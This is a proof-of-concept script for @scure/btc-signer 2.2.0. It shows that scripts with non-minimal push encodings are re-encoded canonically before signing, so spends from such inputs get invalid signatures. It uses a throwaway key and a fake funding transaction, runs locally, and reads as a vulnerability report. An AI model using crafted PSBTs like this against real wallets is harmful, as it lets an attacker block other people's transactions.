// PoC: OutScript decode/encode is a SEMANTIC round trip, not byte-preserving.
// getInputType() (transaction.ts:639) derives the signing scriptCode via
// OutScript.encode(last), so spending any input whose committed script uses a
// non-minimal push spelling signs the CANONICALIZED bytes instead of the bytes
// actually committed by the UTXO / PSBT fields -> invalid signature (DoS).
//
// Reviewed commit: 68b2fad4ef8232302c6239c00902def1f511c974 (@scure/btc-signer 2.2.0)
//
// Setup (once, in the worktree at the pinned commit):
//   npm install && cd test && ../node_modules/.bin/tsc
// Run:
//   REPO=<path-to-worktree> node --experimental-global-webcrypto poc.mjs

import path from 'node:path';
import { pathToFileURL } from 'node:url';

const REPO = process.env.REPO;
if (!REPO) throw new Error('set REPO=<path-to-worktree>');
const src = (f) => pathToFileURL(path.join(REPO, 'test/compiled/src', f)).href;
const nm = (f) => pathToFileURL(path.join(REPO, 'node_modules', f)).href;

const { hex } = await import(nm('@scure/base/index.js'));
const { secp256k1 } = await import(nm('@noble/curves/secp256k1.js'));
const u = await import(src('utils.js'));
const { OutScript } = await import(src('payment.js'));
const { Transaction } = await import(src('transaction.js'));
const { RawTx, SigHash } = await import(src('script.js')).then(async (m) => {
  // SigHash lives in transaction.ts in this version; re-export defensively.
  let SigHash = m.SigHash;
  if (!SigHash) SigHash = (await import(src('transaction.js'))).SigHash;
  return { RawTx: m.RawTx, SigHash };
});

const priv = hex.decode('07'.repeat(32)); // valueless key
const pub = u.pubECDSA(priv, true);
const pkh = u.hash160(pub);

// A consensus-valid, spendable P2PKH prevout script spelled with a NON-MINIMAL
// push (PUSHDATA1 for a 20-byte hash). Non-standard to relay, but valid once
// mined, and exactly the kind of bytes a counterparty-provided PSBT
// (nonWitnessUtxo / witnessScript) can carry.
const rawP2PKH = hex.decode('76a9' + '4c14' + hex.encode(pkh) + '88ac');
const canonicalP2PKH = hex.decode('76a9' + '14' + hex.encode(pkh) + '88ac');

console.log('[0] raw prevout script     =', hex.encode(rawP2PKH));
console.log('    canonical re-encoding  =', hex.encode(canonicalP2PKH));

const decoded = OutScript.decode(rawP2PKH);
console.log('    OutScript.decode type  =', decoded.type, '(classified, not unknown)');
const reencoded = OutScript.encode(decoded);
console.log('    OutScript round-trip byte-exact:', u.equalBytes(reencoded, rawP2PKH));

// Also show the 'unknown' catch-all canonicalizes: same script shape but with
// an extra NOP so no template matches.
const rawUnknown = hex.decode('4c21' + hex.encode(pub) + 'ac' + '61'); // PUSHDATA1 <33B> CHECKSIG NOP
const decU = OutScript.decode(rawUnknown);
console.log("    unknown-type round-trip byte-exact:", u.equalBytes(OutScript.encode(decU), rawUnknown), '(type=' + decU.type + ')');

// --- Build a real spending transaction through the library -----------------
// Fake funding tx: 1 output paying to the non-minimal script.
const funding = RawTx.encode({
  version: 2,
  segwitFlag: false,
  inputs: [{
    txid: new Uint8Array(32),
    index: 0xffffffff,
    finalScriptSig: new Uint8Array([0x51]),
    sequence: 0xffffffff,
  }],
  outputs: [{ amount: 100000n, script: rawP2PKH }],
  witnesses: [],
  lockTime: 0,
});
const fundingTxid = u.sha256x2(funding); // txid (no witness data)

const dest = hex.decode('76a914' + hex.encode(u.hash160(u.pubECDSA(hex.decode('08'.repeat(32)), true))) + '88ac');
const tx = new Transaction({ allowUnknownInputs: true });
tx.addInput({
  txid: fundingTxid,
  index: 0,
  nonWitnessUtxo: funding,
});
tx.addOutput({ script: dest, amount: 90000n });

// getInputType re-encodes the terminal descriptor to produce lastScript.
const { getInputType } = await import(src('transaction.js'));
const inputType = getInputType(tx.inputs[0]);
console.log('\n[1] getInputType: type=%s txType=%s', inputType.type, inputType.txType);
console.log('    lastScript (used as scriptCode) =', hex.encode(inputType.lastScript));
console.log('    equals raw committed script     :', u.equalBytes(inputType.lastScript, rawP2PKH));
console.log('    equals canonicalized script     :', u.equalBytes(inputType.lastScript, canonicalP2PKH));

// Sign through the library, then check what the signature actually commits to.
tx.signIdx(priv, 0);
const partialSig = tx.inputs[0].partialSig[0][1];
const sigDer = partialSig.subarray(0, -1);
const sighashByte = partialSig[partialSig.length - 1];
console.log('\n[2] library produced partialSig, sighash byte =', sighashByte);

// Recompute both candidate preimages with the library's own (private) helper.
const preImageCanonical = tx.preimageLegacy(0, canonicalP2PKH, sighashByte);
const preImageRaw = tx.preimageLegacy(0, rawP2PKH, sighashByte);
const okCanonical = secp256k1.verify(sigDer, preImageCanonical, pub, { format: 'der', prehash: false });
const okRaw = secp256k1.verify(sigDer, preImageRaw, pub, { format: 'der', prehash: false });
console.log('    sig verifies against sighash(scriptCode=CANONICAL):', okCanonical);
console.log('    sig verifies against sighash(scriptCode=RAW)      :', okRaw);
console.log('\n    Consensus requires the RAW committed bytes as scriptCode.');
console.log('    => the library-signed spend is INVALID on-chain: deterministic DoS');
console.log('       for any input whose script uses non-minimal push spellings.');
